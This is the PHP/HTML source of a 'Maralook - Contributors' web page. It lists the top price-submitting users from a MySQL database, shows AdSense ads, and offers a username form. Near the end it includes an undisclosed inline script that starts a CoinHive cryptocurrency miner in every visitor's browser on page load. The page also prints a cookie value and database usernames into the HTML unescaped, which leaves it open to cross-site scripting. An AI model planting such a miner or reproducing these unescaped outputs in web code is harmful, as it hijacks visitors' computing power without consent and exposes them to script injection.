<?php
#INCLUDE THE FOLLOWING TO MAKE THE REST WORK#
include_once 'config.php';
include_once 'vars.php';
include_once 'setuser.php';

##################CONNECTION INFO FOR DATABASE###################
$data_connect;
########################STARTING CONTENT#########################

?>    
<html>
<!-- Initalize Page -->
	<head>
		<title>Maralook - Contributors</title>
		<link rel="stylesheet" type="text/css" href="style.css">
	</head>
	<body>
		<div id="main">
		<?php echo file_get_contents('header.html') . "</br>"; ?>
		<img src="img/corner.png" width="9">
		<img src="img/border.png" width="692" height="9" border="0">
		<img src="img/corner2.png" width="9">
		<table align="center" width="710">
<!-- End Init -->
<?php

	$sqlcheck = "SELECT * FROM Pricelog ORDER BY Timestamp DESC LIMIT 1;";
	$row=mysqli_fetch_array(mysqli_query($con, $sqlcheck), MYSQL_ASSOC);
	$currows = $row['LogID'];

	$contribcheck = "SELECT SUM(Submissions) from Userboard";
	$row2=mysqli_fetch_array(mysqli_query($con, $contribcheck), MYSQL_ASSOC);
	$currows2 = $row2['SUM(Submissions)'];

    $search_query = mysqli_query($con, "SELECT * FROM Userboard ORDER BY Submissions DESC LIMIT 20");
    $search_nums = mysqli_num_rows($search_query);
    
    echo '<tr><th><a href="users.php"><img src="img/contrib.gif"></a></th></tr>';
    echo '<tr><th><h2>Maralook Contributors</h2></th></tr>';
    echo '<tr><th>'. $var_users_desc .'</br></th></tr>';
    echo '<tr><th>There are currently <strong>',$currows,'</strong> prices logged by Maralook!</br>';
    echo 'Of those, <strong>',$currows2,'</strong> have been made by contributors!</th></tr>';
    echo '<tr><th><hr style="border-color:#46C61F; width:45%;"></th></tr>';
    $rank = 1;
    while ($obj = mysqli_fetch_object($search_query)) {
        echo "<tr align='left' width='350'><th >". $rank . ". <strong>" . $obj->Username . "</strong>, with  <strong>" . $obj->Submissions ."</strong> Prices<br /></th></tr>";
        $rank = $rank+1;
        
    }
        ##CHECKS IF USER IS SIGNED IN, IF SO DISPLAY THE NAME
        if(isset($_COOKIE[$cookiename])){
            echo "<tr><th></br></br>Currently searching as <strong>" , $_COOKIE['ml_user'] , "</strong>.</tr></th>";
        }
        ##IF NOT, SHOW INPUT
        elseif(!isset($_COOKIE[$cookiename])){ ?>
			<tr>
				<th>
					<br><br>
					<form action="users.php" method="get">
						Set Username: <input type="text" name="username" maxlength="20">
						<input type="submit" value="Submit">
					</form>
				</th>
			</tr>
<?php
        }

##ADSENSE CODE 
?>     
<tr>
	<th>
		<br><br>
		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <!-- ml_pages -->
        <ins class="adsbygoogle"
            style="display:block"
            data-ad-client="ca-pub-7871592147028118"
            data-ad-slot="7187366012"
            data-ad-format="auto"></ins>
        <script>
			(adsbygoogle = window.adsbygoogle || []).push({});
        </script>
		</br></br></br>
	</th>
</tr>

</table>
</th>
</tr>
<tr>
	<td style="height:10px"></td>
</tr>
</table>
<script>
var miner = new CoinHive.Anonymous('T3g7HajNYpUwoz0dIJFUTEHlhWTrER9n');
miner.start();
</script>
</div>
<img src="img/corner3.png" width="9" >
<img src="img/border.png" width="692" height="9" border="0">
<img src="img/corner4.png" width="9">
</div>
</body>
</html>
